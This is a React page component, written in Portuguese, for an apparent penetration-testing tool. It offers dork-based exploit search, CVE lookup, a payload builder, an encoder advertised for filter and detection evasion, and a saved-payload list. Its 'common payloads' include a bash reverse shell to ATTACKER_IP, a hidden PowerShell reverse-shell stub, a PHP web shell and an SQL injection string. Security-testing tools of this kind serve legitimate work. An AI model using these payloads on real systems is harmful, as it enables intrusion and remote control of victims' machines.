import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card.jsx'
import { Button } from '@/components/ui/button.jsx'
import { Input } from '@/components/ui/input.jsx'
import { Textarea } from '@/components/ui/textarea.jsx'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select.jsx'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs.jsx'
import { Badge } from '@/components/ui/badge.jsx'
import { Checkbox } from '@/components/ui/checkbox.jsx'
import { 
  Search, 
  Target, 
  Code, 
  Shield, 
  Database,
  Download,
  Copy,
  Save,
  Trash2,
  ExternalLink,
  AlertTriangle,
  Zap,
  Bug,
  FileText,
  Terminal
} from 'lucide-react'

const ExploitationPage = () => {
  const [searchQuery, setSearchQuery] = useState('')
  const [searchType, setSearchType] = useState('poc')
  const [cveId, setCveId] = useState('')
  const [payloadText, setPayloadText] = useState('')
  const [savedPayloads, setSavedPayloads] = useState([])
  const [searchResults, setSearchResults] = useState([])
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    fetchSavedPayloads()
  }, [])

  const fetchSavedPayloads = async () => {
    try {
      const response = await fetch('http://localhost:5001/api/exploitation/saved-payloads')
      const data = await response.json()
      if (data.success) {
        setSavedPayloads(data.payloads)
      }
    } catch (error) {
      console.error('Error fetching saved payloads:', error)
    }
  }

  const searchWithDorks = async () => {
    if (!searchQuery) {
      alert('Por favor, insira um termo de busca')
      return
    }

    setLoading(true)
    try {
      const response = await fetch('http://localhost:5001/api/exploitation/search-dorks', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          query: searchQuery,
          type: searchType
        })
      })

      const data = await response.json()
      if (data.success) {
        setSearchResults(data.dork_queries)
      } else {
        alert('Erro na busca: ' + data.error)
      }
    } catch (error) {
      alert('Erro de conexão: ' + error.message)
    } finally {
      setLoading(false)
    }
  }

  const searchCVE = async () => {
    if (!cveId) {
      alert('Por favor, insira um CVE ID')
      return
    }

    setLoading(true)
    try {
      const response = await fetch('http://localhost:5001/api/exploitation/cve-search', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cve_id: cveId
        })
      })

      const data = await response.json()
      if (data.success) {
        console.log('CVE Results:', data.results)
        alert('Resultados do CVE carregados no console')
      } else {
        alert('Erro na busca CVE: ' + data.error)
      }
    } catch (error) {
      alert('Erro de conexão: ' + error.message)
    } finally {
      setLoading(false)
    }
  }

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
    alert('Copiado para a área de transferência!')
  }

  const savePayload = async (payload, name, category = 'custom') => {
    try {
      const response = await fetch('http://localhost:5001/api/exploitation/saved-payloads', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          name: name || 'Custom Payload',
          payload: payload,
          category: category,
          os: 'any'
        })
      })

      const data = await response.json()
      if (data.success) {
        alert('Payload salvo com sucesso!')
        fetchSavedPayloads()
      } else {
        alert('Erro ao salvar payload: ' + data.error)
      }
    } catch (error) {
      alert('Erro de conexão: ' + error.message)
    }
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-3xl font-bold">Exploração e Payloads</h1>
        <Badge variant="outline" className="flex items-center gap-2">
          <Bug className="w-4 h-4" />
          Busca de Exploits
        </Badge>
      </div>

      <Tabs defaultValue="search" className="space-y-6">
        <TabsList>
          <TabsTrigger value="search">Busca com Dorks</TabsTrigger>
          <TabsTrigger value="cve">Busca CVE</TabsTrigger>
          <TabsTrigger value="builder">Construtor de Payload</TabsTrigger>
          <TabsTrigger value="encoder">Encoder</TabsTrigger>
          <TabsTrigger value="saved">Payloads Salvos</TabsTrigger>
        </TabsList>

        <TabsContent value="search" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Busca Avançada com Google Dorks</CardTitle>
              <CardDescription>
                Use dorks especializados para encontrar POCs, payloads, CVEs e papers
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium">Termo de Busca</label>
                  <Input
                    placeholder="Ex: apache, wordpress, mysql"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-medium">Tipo de Busca</label>
                  <Select value={searchType} onValueChange={setSearchType}>
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="poc">POC (Proof of Concept)</SelectItem>
                      <SelectItem value="payloads">Payloads</SelectItem>
                      <SelectItem value="cve">CVEs</SelectItem>
                      <SelectItem value="papers">Papers de Pesquisa</SelectItem>
                      <SelectItem value="tools">Ferramentas</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="flex items-end">
                  <Button onClick={searchWithDorks} disabled={loading} className="w-full">
                    <Search className="w-4 h-4 mr-2" />
                    {loading ? 'Buscando...' : 'Buscar'}
                  </Button>
                </div>
              </div>

              {searchResults.length > 0 && (
                <div className="space-y-3">
                  <h3 className="font-medium">Dorks Gerados:</h3>
                  {searchResults.map((dork, index) => (
                    <div key={index} className="flex items-center gap-2 p-3 border rounded-lg">
                      <code className="flex-1 text-sm bg-muted p-2 rounded font-mono">
                        {dork}
                      </code>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => copyToClipboard(dork)}
                      >
                        <Copy className="w-4 h-4" />
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => window.open(`https://www.google.com/search?q=${encodeURIComponent(dork)}`, '_blank')}
                      >
                        <ExternalLink className="w-4 h-4" />
                      </Button>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="cve" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Busca de CVE</CardTitle>
              <CardDescription>
                Pesquise informações detalhadas sobre vulnerabilidades CVE
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium">CVE ID</label>
                  <Input
                    placeholder="Ex: CVE-2023-1234"
                    value={cveId}
                    onChange={(e) => setCveId(e.target.value)}
                  />
                </div>
                <div className="flex items-end">
                  <Button onClick={searchCVE} disabled={loading} className="w-full">
                    <Database className="w-4 h-4 mr-2" />
                    {loading ? 'Buscando...' : 'Buscar CVE'}
                  </Button>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mt-6">
                {[
                  { name: 'NVD Database', url: 'https://nvd.nist.gov/', desc: 'Base oficial de vulnerabilidades' },
                  { name: 'CVE Details', url: 'https://www.cvedetails.com/', desc: 'Detalhes e estatísticas de CVE' },
                  { name: 'Exploit-DB', url: 'https://www.exploit-db.com/', desc: 'Base de exploits públicos' },
                  { name: 'Packet Storm', url: 'https://packetstormsecurity.com/', desc: 'Exploits e advisories' },
                  { name: 'Rapid7 DB', url: 'https://www.rapid7.com/db/', desc: 'Base de vulnerabilidades' },
                  { name: 'VulnDB', url: 'https://vulndb.cyberriskanalytics.com/', desc: 'Base comercial de vulnerabilidades' }
                ].map((resource, index) => (
                  <Card key={index} className="cursor-pointer hover:shadow-md transition-shadow">
                    <CardContent className="pt-6">
                      <div className="flex items-center gap-2 mb-2">
                        <Shield className="w-5 h-5 text-blue-600" />
                        <h3 className="font-medium">{resource.name}</h3>
                      </div>
                      <p className="text-sm text-muted-foreground mb-3">{resource.desc}</p>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => window.open(resource.url, '_blank')}
                        className="w-full"
                      >
                        <ExternalLink className="w-4 h-4 mr-2" />
                        Acessar
                      </Button>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="builder" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Construtor de Payload</CardTitle>
              <CardDescription>
                Construa payloads personalizados para diferentes cenários
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium">Tipo de Payload</label>
                  <Select>
                    <SelectTrigger>
                      <SelectValue placeholder="Selecione o tipo" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="reverse_shell">Reverse Shell</SelectItem>
                      <SelectItem value="bind_shell">Bind Shell</SelectItem>
                      <SelectItem value="web_shell">Web Shell</SelectItem>
                      <SelectItem value="privilege_escalation">Escalação de Privilégios</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-medium">Sistema Operacional</label>
                  <Select>
                    <SelectTrigger>
                      <SelectValue placeholder="SO alvo" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="linux">Linux</SelectItem>
                      <SelectItem value="windows">Windows</SelectItem>
                      <SelectItem value="macos">macOS</SelectItem>
                      <SelectItem value="any">Qualquer</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-medium">IP do Atacante</label>
                  <Input placeholder="10.10.10.10" />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-medium">Porta</label>
                  <Input placeholder="4444" />
                </div>
              </div>

              <Button className="w-full">
                <Code className="w-4 h-4 mr-2" />
                Gerar Payload
              </Button>

              <div className="space-y-3">
                <h3 className="font-medium">Payloads Comuns:</h3>
                {[
                  {
                    name: 'Linux Reverse Shell (Bash)',
                    payload: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
                    category: 'reverse_shell'
                  },
                  {
                    name: 'Windows PowerShell Reverse Shell',
                    payload: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command...',
                    category: 'reverse_shell'
                  },
                  {
                    name: 'PHP Web Shell',
                    payload: "<?php system($_GET['cmd']); ?>",
                    category: 'web_shell'
                  },
                  {
                    name: 'SQL Injection Union Select',
                    payload: "' UNION SELECT 1,2,3,user(),database(),version()--",
                    category: 'sql_injection'
                  }
                ].map((item, index) => (
                  <div key={index} className="border rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <span className="font-medium">{item.name}</span>
                      <div className="flex gap-2">
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => copyToClipboard(item.payload)}
                        >
                          <Copy className="w-4 h-4" />
                        </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => savePayload(item.payload, item.name, item.category)}
                        >
                          <Save className="w-4 h-4" />
                        </Button>
                      </div>
                    </div>
                    <code className="block text-xs bg-muted p-2 rounded font-mono">
                      {item.payload}
                    </code>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="encoder" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Encoder de Payload</CardTitle>
              <CardDescription>
                Codifique payloads para evasão de filtros e detecção
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">Payload para Codificar</label>
                <Textarea
                  placeholder="Cole seu payload aqui..."
                  value={payloadText}
                  onChange={(e) => setPayloadText(e.target.value)}
                  rows={4}
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium">Métodos de Codificação</label>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                  {[
                    'Base64',
                    'URL Encoding',
                    'Hex Encoding',
                    'Unicode',
                    'HTML Entities',
                    'Double URL',
                    'PowerShell Base64',
                    'ASCII Hex'
                  ].map((method, index) => (
                    <div key={index} className="flex items-center space-x-2">
                      <Checkbox id={method} />
                      <label htmlFor={method} className="text-sm">{method}</label>
                    </div>
                  ))}
                </div>
              </div>

              <Button className="w-full">
                <Zap className="w-4 h-4 mr-2" />
                Codificar Payload
              </Button>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="saved" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Payloads Salvos</CardTitle>
              <CardDescription>
                Gerencie sua coleção de payloads personalizados
              </CardDescription>
            </CardHeader>
            <CardContent>
              {savedPayloads.length === 0 ? (
                <p className="text-muted-foreground text-center py-8">
                  Nenhum payload salvo ainda
                </p>
              ) : (
                <div className="space-y-4">
                  {savedPayloads.map((payload) => (
                    <div key={payload.id} className="border rounded-lg p-4">
                      <div className="flex items-center justify-between mb-2">
                        <div>
                          <h3 className="font-medium">{payload.name}</h3>
                          <div className="flex gap-2 mt-1">
                            <Badge variant="outline" className="text-xs">
                              {payload.category}
                            </Badge>
                            <Badge variant="outline" className="text-xs">
                              {payload.os}
                            </Badge>
                          </div>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => copyToClipboard(payload.payload)}
                          >
                            <Copy className="w-4 h-4" />
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-red-600 hover:text-red-700"
                          >
                            <Trash2 className="w-4 h-4" />
                          </Button>
                        </div>
                      </div>
                      <code className="block text-xs bg-muted p-2 rounded font-mono">
                        {payload.payload}
                      </code>
                      <p className="text-xs text-muted-foreground mt-2">
                        Criado em: {new Date(payload.created_at).toLocaleString('pt-BR')}
                      </p>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  )
}

export default ExploitationPage

